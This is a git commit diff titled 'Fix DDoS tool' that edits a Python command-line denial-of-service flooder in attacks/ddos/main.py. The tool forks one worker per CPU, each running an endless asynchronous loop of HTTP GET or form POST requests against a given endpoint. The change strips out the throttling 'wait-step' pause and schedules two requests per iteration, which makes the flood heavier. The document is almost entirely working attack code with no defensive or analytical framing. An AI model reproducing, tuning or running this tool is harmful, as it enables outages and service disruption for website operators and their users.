0c74ee83423c3916e3d189de720119276dfd6eca
Sebastian Gaviria Tangarife <sgt.911@outlook.com>
2024-03-05 17:02:25 -0500

    Fix DDoS tool

--- attacks/ddos/main.py
+++ attacks/ddos/main.py
@@ -8,13 +8,12 @@ from urllib.parse import urlencode
 @click.command('ddos')
 @click.option('-w', '--workers', type=click.INT, default=multiprocessing.cpu_count(),
               help='Number of workers sending requests')
-@click.option('-W', '--wait-step', type=click.INT, default=1000, help='Wait step in task stream')
 @click.option('-d', '--data', multiple=True, help='Data in form-data format to send, If request is GET is ignored')
 @click.option('-m', '--method', default='GET', help='Request Method')
 @click.argument('endpoint', required=True)
-def main(workers, method, endpoint, data, wait_step):
+def main(workers, method, endpoint, data):
     data = dict([entry.split('=') for entry in data])
-    threads = [multiprocessing.Process(target=fork_worker, args=(method, endpoint, data, wait_step)) for _ in range(workers)]
+    threads = [multiprocessing.Process(target=fork_worker, args=(method, endpoint, data)) for _ in range(workers)]
 
     try:
         for thread in threads:
@@ -26,14 +25,14 @@ def main(workers, method, endpoint, data, wait_step):
             thread.kill()
 
 
-def fork_worker(method, endpoint, data, wait_step):
+def fork_worker(method, endpoint, data):
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
-    loop.create_task(task_stream(method, endpoint, data, loop, wait_step))
+    loop.create_task(task_stream(method, endpoint, data, loop))
     loop.run_forever()
 
 
-async def task_stream(method, endpoint, data, loop, wait_step):
+async def task_stream(method, endpoint, data, loop):
     print(f'Starting {multiprocessing.current_process().pid}')
     async with AsyncClient() as http_client:
         if method == 'GET':
@@ -42,13 +41,10 @@ async def task_stream(method, endpoint, data, loop, wait_step):
             _data = urlencode(data).encode()
             headers = {'Content-Type': 'application/x-www-form'}
             callback = lambda: http_client.request(method, endpoint, headers=headers, content=_data)
-        i = 0
         while True:
-            if i == wait_step:
-                await asyncio.sleep(0.05)
-                i = -1
             loop.create_task(make_request(callback))
-            i += 1
+            loop.create_task(make_request(callback))
+            await asyncio.sleep(0)
 
 
 async def make_request(fx):
